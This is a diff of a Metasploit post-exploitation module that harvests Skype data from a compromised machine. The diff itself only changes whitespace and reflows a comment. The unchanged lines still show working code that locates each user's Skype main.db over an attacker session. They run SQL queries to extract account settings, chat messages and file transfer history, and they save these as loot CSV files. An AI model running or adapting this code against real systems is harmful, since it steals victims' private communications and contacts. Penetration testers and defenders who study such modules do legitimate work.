@@ -6,7 +6,7 @@
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+#   http://metasploit.com/framework/
 ##
 
 require 'msf/core'
@@ -19,24 +19,20 @@ require 'msf/core/post/windows/user_profiles'
 
 require 'msf/core/post/osx/system'
 
-
-
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::Common
 	include Msf::Post::File
 	include Msf::Post::Windows::UserProfiles
-	
 	include Msf::Post::OSX::System
 
-	
-	
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Multi Gather Skype User Data Enumeration',
 				'Description'   => %q{
-					This module will enumerate the Skype accounts settings, contact list, call history, chat logs,
-					file transfer history and voicemail log saving all the data in to CSV files for analysis.
+					This module will enumerate the Skype accounts settings, contact list,
+					call history, chat logs, file transfer history and voicemail log saving all
+					the data in to CSV files for analysis.
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
@@ -50,7 +46,7 @@ class Metasploit3 < Msf::Post
 	def run
 		# syinfo is only on meterpreter sessions
 		print_status("Running module for Skype enumeration against #{sysinfo['Computer']}") if not sysinfo.nil?
-		
+
 		# Ensure that SQLite3 gem is installed
 		begin
 			require 'sqlite3'
@@ -98,7 +94,7 @@ class Metasploit3 < Msf::Post
 		else
 			file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
 		end
-		
+
 		file_loc = store_loot("skype.config",
 				"binary/db",
 				session,
@@ -149,7 +145,7 @@ class Metasploit3 < Msf::Post
 		# Check if an account exists and if it does enumerate if not exit.
 		if user_rows.length > 1
 			user_info = store_loot("skype.accounts",
-						"text/plain", 
+						"text/plain",
 						session,
 						"",
 						"skype_accounts.csv",
@@ -161,14 +157,14 @@ class Metasploit3 < Msf::Post
 			print_error("No skype accounts are configured for #{user}")
 			return
 		end
-	
+
 		# Extract chat log from the database
 		print_status("Extracting chat message log")
 		cl_rows = db.execute2('SELECT "chatname", "convo_id", "author", "dialog_partner",
 					datetime("timestamp","unixepoch"), "body_xml",
 					"remote_id" FROM "Messages" WHERE type == 61;')
 		chat_log = store_loot("skype.chat",
-						"text/plain", 
+						"text/plain",
 						session,
 						"",
 						"skype_chatlog.csv",
@@ -184,7 +180,7 @@ class Metasploit3 < Msf::Post
 
 		# Extract file transfer history
 		print_status("Extracting file transfer history")
-		ft_rows = db.execute2('SELECT "partner_handle", "partner_dispname", 
+		ft_rows = db.execute2('SELECT "partner_handle", "partner_dispname",
 					datetime("starttime","unixepoch"), datetime("finishtime","unixepoch"),
 					"filepath", "filename", "filesize", "bytestransferred",
 					"convo_id", datetime("accepttime","unixepoch") FROM "Transfers";')
